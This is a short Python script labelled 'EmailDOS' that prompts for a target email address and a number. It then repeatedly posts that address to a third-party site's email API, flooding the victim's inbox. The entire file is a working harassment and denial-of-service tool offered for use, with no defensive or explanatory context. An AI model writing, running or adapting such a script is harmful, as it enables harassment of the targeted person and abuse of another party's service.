import requests
import json

print("EmailDOS")
print("")
email = raw_input("What email address do you want to spam:  ")
amount = raw_input("How many emails do you want to send:  ")

x = {
  "PlaceholderInt": 0,
  "PlaceholderBool": "true",
  "PlaceholderBool": "true",
  "emailAddress": email,
}

for i in range(int(amount)):
	r = requests.post('https://ezpzproblem.com/api/emailendpoint', data=json.dumps(x))
	print(i, "Email has been sent..." "Response Status Code:", r.status_code)
